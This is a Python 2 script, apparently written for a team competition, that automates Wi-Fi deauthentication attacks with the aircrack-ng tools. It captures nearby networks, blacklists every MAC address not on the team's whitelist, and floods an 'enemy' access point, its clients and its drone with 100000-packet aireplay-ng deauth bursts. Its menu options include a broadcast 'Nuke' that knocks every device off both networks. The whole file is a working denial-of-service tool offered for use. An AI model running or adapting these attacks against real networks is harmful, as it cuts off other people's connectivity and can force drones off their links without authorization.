import os, subprocess, signal, time, exceptions, threading

#Clear the screen
os.system("clear")

#Variables
packetcount = "1"
BROADCAST_BSSID = "FF:FF:FF:FF:FF:FF"	#This is fire
FRIENDLY_BSSID = "8A:DC:96:3F:91:CD"    #Friendly solo
ENEMY_BSSID = "8A:DC:96:3F:6E:EE"   	#Enemy solo
DLINK_BSSID = "68:7F:74:0C:8E:53"    	#DLink
ENEMY_DRONE = "88:DC:96:3F:78:0C"	#Their Drone
all_macs = []
blacklist = []
whitelist = []

#Compiles whitelist of MACs
whitelist.append("E4:A4:71:9C:E8:90")	#Teddy pc
whitelist.append("00:24:D7:BE:19:10")	#Matt PC
whitelist.append("00:24:D7:BF:4A:A8")	#Khan pc
whitelist.append("AC:FD:CE:12:74:24")	#Old pc
whitelist.append("88:DC:96:34:A1:F0")	#Drone
whitelist.append("00:0C:29:78:6B:C0")	#Bailey pc
whitelist.append("4C:66:41:E1:F2:28")	#Teddy phone
whitelist.append("B4:8B:19:ED:1A:8C")	#Khan phone
whitelist.append("8A:DC:96:3F:6E:EE")	#Enemy Controller

#Function to refresh the list of enemy MAC addresses
def update_blacklist():

	#Reading logs for gathered MAC addresses
	macs_log_their_network = open("/root/Desktop/Summer/enemy_log", "r")
	macs_log_our_network = open("/root/Desktop/Summer/friendly_log", "r")
	macs_content_their_network = macs_log_their_network.readlines()
	macs_content_our_network = macs_log_our_network.readlines()

	#Concatinates all gathered MAC addresses into all_macs without redundancy
	for mac in macs_content_their_network:
		mac = mac[: -1]
		if mac not in macs_content_our_network:
			all_macs.append(mac)
		else:
			pass
	for mac in macs_content_our_network:
		mac = mac[: -1]
		all_macs.append(mac)

	#Compares gathered MAC addresses to whitelisted addresses and adds enemy MACs to blacklist
	for mac in all_macs:
		if mac in whitelist:
			pass
		else:
			blacklist.append(mac)
update_blacklist()

#Function to update the blacklist and refresh the attack every 15 seconds
def auto_update_blacklist(recall):
	while getattr(t, "do_run", True):
		os.system("pkill aireplay-ng")
		update_blacklist()
		recall()
		time.sleep(15)

#Function to update the blacklist every 15 seconds without calling an attack
def empty_auto_update_blacklist():
	while getattr(t, "do_run", True):
		update_blacklist()
		time.sleep(15)

#Creates thread with empty_auto_update_blacklist
blacklist_update = threading.Thread(target=empty_auto_update_blacklist, args=())
blacklist_update.daemon = True
blacklist_update.start()

#Function to check if thread is alive and to kill it
def kill_thread():
	if blacklist_update.isAlive():
		blacklist_update.do_run = False
		blacklist_update.join()

#Starts wifi card in monitor mode
os.system("airmon-ng start wlan0")

#Deletes previous capture output and saves new capture output
os.system("echo 'Attempting to delete previous capture.'")
os.system("rm -f /root/Desktop/Summer/my-01.csv")
os.system("clear && echo 'Previous capture deleted, Creating new capture.'")	
os.system("gnome-terminal -e 'timeout 14 airodump-ng -w my --output-format csv --write-interval 4 wlan0mon'")
time.sleep(16)
os.system("clear && echo 'New capture created.'")
time.sleep(2)
os.system("pkill airodump-ng")
os.system("clear")

#Parse capture output for friendly and enemy network channels
file = open("/root/Desktop/Summer/my-01.csv", "r")
content = file.read()
try:
	our_channel = content[content.index("8A:DC:96:3F:91:CD") +61 :]
	our_channel = our_channel[:our_channel.index("54") -3]
except:
	os.system("clear")
	raw_input("Friendly network not found, exiting.")
	exit()
try:
	their_channel = content[content.index("8A:DC:96:3F:6E:EE") +61 :]
	their_channel = their_channel[:their_channel.index("54") -3]
except:
	os.system("clear")
	raw_input("Enemy network not found, exiting.")
	exit()
file.close()

#DeAuthenticating all enemy MAC addresses in the array for our network
def kill_ours():
	kill_thread()
	packetcount = "100000"
	os.system("iwconfig wlan0mon channel "+ our_channel)
	for mac in blacklist:
		os.system("gnome-terminal -e 'aireplay-ng -0 " + packetcount + " -a "+ FRIENDLY_BSSID + " -c "+mac + " wlan0mon'")

	#Creating thread to update blacklist in the background during attack	
	blacklist_update = threading.Thread(target=auto_update_blacklist, args=(kill_ours,))
	blacklist_update.daemon = True
	blacklist_update.start()
	prompt()

#DeAuthenticating all enemy MAC addresses in the array for their network
def kill_theirs():
	kill_thread()
	packetcount = "100000"
	os.system("iwconfig wlan0mon channel "+ their_channel)
	for mac in blacklist:
		os.system("gnome-terminal -e 'aireplay-ng -0 " + packetcount + " -a "+ ENEMY_BSSID + " -c "+mac + " wlan0mon'")

	#Creating thread to update blacklist in the background during attack	
	blacklist_update = threading.Thread(target=auto_update_blacklist, args=(kill_theirs,))
	blacklist_update.daemon = True
	blacklist_update.start()	
	prompt()	
		
#DeAuthenticating all enemy MAC addresses in the array for both networks	
def kill_both():
	kill_thread()
	while True:
		update_blacklist()
		for mac in blacklist:
			os.system("iwconfig wlan0mon channel "+ our_channel)
			test = subprocess.call("aireplay-ng -0 " + packetcount + " -a "+ FRIENDLY_BSSID + " -c "+mac + " wlan0mon", shell=True)
		for mac in blacklist:
			os.system("iwconfig wlan0mon channel "+ their_channel)
			test = subprocess.call("aireplay-ng -0 " + packetcount + " -a "+ ENEMY_BSSID + " -c "+mac + " wlan0mon", shell=True)

#DeAuthenticating ALL MAC addresses for both networks
def kill_all():
	kill_thread()
	while True:
		try:
			os.system("iwconfig wlan0mon channel "+ our_channel)
			test = subprocess.call("aireplay-ng -0 " + packetcount + " -a "+ FRIENDLY_BSSID + " -c "+BROADCAST_BSSID + " wlan0mon", shell=True)
			os.system("iwconfig wlan0mon channel "+ their_channel)
			test = subprocess.call("aireplay-ng -0 " + packetcount + " -a "+ ENEMY_BSSID + " -c "+BROADCAST_BSSID + " wlan0mon", shell=True)
		except NameError:
			pass

#Specifically target enemy drone and send it home	
def kill_enemy_drone():
	kill_thread()
	packetcount = "100000"
	os.system("iwconfig wlan0mon channel "+ their_channel)
	os.system("gnome-terminal -e 'aireplay-ng -0 " + packetcount + " -a "+ ENEMY_BSSID + " -c "+ENEMY_DRONE + " wlan0mon'")
	prompt()

#DeAuthenticate all MACs on enemy network only
def tac_nuke():
	os.system("iwconfig wlan0mon channel "+ their_channel)
	packetcount = "100000"
	os.system("gnome-terminal -e 'aireplay-ng -0 " + packetcount + " -a "+ ENEMY_BSSID + " -c "+BROADCAST_BSSID + " wlan0mon'")
	
#Creation of menu
def prompt():
	os.system("clear")
	os.system("echo '1. Defend our network'")
	os.system("echo '2. Attack their network'")
	os.system("echo '3. Attack and defend'")
	os.system("echo '4. Nuke :D'")
	os.system("echo '5. Attack enemy drone'")
	os.system("echo '6. Tactical Nuke'")	
	os.system("echo '7. Kill all attacks'")

	#Selection of what you want to do
	mode = int(raw_input())
	if mode == 1:
		kill_ours()
	elif mode == 2:
		kill_theirs()
	elif mode == 3:
		kill_both()
	elif mode == 4:
		kill_all()
	elif mode == 5:
		kill_enemy_drone()
	elif mode == 6:
		tac_nuke()
	elif mode == 7:
		os.system("pkill aireplay-ng")
		update_blacklist()
		prompt()
	else:
		raw_input("Invalid response")
		prompt()

prompt()
